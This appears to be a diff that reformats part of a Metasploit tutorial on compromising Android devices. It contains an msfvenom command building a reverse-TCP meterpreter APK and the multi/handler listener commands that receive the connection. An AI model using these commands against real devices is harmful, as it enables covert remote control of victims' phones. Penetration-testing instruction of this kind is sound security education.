@@ -55,8 +55,15 @@ A payload is the code executed on a target system once it is compromised. Payloa
 
 Here is a command using msfvenom that creates an exploit using the payload android/meterpreter/reverse\_tcp:
 
-| msfvenom \\\-platform android \\\-a java \\\-p android/meterpreter/reverse\_tcp \\R\> exploitCode.apk \\LHOST=\<host's ip\>LPORT=4444  |
-| :---- |
+```bash
+msfvenom \
+  -platform android \
+  -a java \
+  -p android/meterpreter/reverse_tcp \
+  R> exploitCode.apk \
+  LHOST=<host's ip> \
+  LPORT=4444
+```
 
 ![][image3]  
 Payload is \-p, LHOST Localhost IP to receive a back connection (Check yours with *if-config* command), LPORT Localhost port on which the connection listens for the victim (we set it to 4444), R Raw format (we select .apk). The target system initiates a connection back to the attacker's machine using TCP. More stable but easier to detect in network monitoring.  
@@ -118,8 +125,13 @@ To receive a connection from the compromised device, start the Metasploit consol
 
 Set up a listener for the reverse shell:
 
-| use exploit/multi/handlerset payload android/meterpreter/reverse\_tcpset LHOST \<attacker\_ip\>set LPORT 4444run |
-| :---- |
+```bash
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST <attacker_ip>
+set LPORT 4444
+run
+```
 
 ![][image11]
 
